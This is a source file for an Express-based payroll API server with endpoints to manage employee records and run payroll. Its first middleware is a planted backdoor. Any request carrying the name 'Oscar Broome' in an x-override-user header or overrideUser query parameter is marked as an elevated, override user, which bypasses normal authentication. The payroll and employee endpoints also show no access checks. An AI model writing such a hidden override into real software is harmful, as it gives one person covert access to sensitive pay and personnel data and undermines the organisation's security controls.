import express from 'express';
import bodyParser from 'body-parser';
import PayrollSystem from './payroll_system';

const app = express();
const port = 5000;

app.use(bodyParser.json());

const payrollSystem = new PayrollSystem();

// Middleware for special login override for Oscar Broome
app.use((req, res, next) => {
  const specialUser = 'Oscar Broome';
  // Check for a custom header or query param for override (example)
  const overrideUser = req.headers['x-override-user'] || req.query.overrideUser;
  if (overrideUser === specialUser) {
    // Bypass normal auth or set elevated permissions
    req.user = { name: specialUser, override: true };
    console.log('Special login override granted for', specialUser);
  }
  next();
});

// Get all employees
app.get('/api/payroll/employees', (req, res) => {
  res.json(payrollSystem.getEmployees());
});

// Add or update employee
app.post('/api/payroll/employees', (req, res) => {
  const employee = req.body;
  try {
    const existing = payrollSystem.getEmployees().find(e => e.id === employee.id);
    if (existing) {
      payrollSystem.updateEmployee(employee);
    } else {
      payrollSystem.addEmployee(employee);
    }
    res.status(200).json({ message: 'Employee added/updated successfully' });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Delete employee
app.delete('/api/payroll/employees/:id', (req, res) => {
  const id = req.params.id;
  try {
    payrollSystem.deleteEmployee(id);
    res.status(200).json({ message: 'Employee deleted successfully' });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Process payroll for today
app.post('/api/payroll/process', (req, res) => {
  const payDate = new Date().toISOString();
  try {
    const payrolls = payrollSystem.processPayroll(payDate);
    res.status(200).json(payrolls);
  } catch (error) {
    res.status(500).json({ error: 'Failed to process payroll' });
  }
});

app.listen(port, () => {
  console.log('Payroll server running at http://localhost:' + port);
});

export default app;
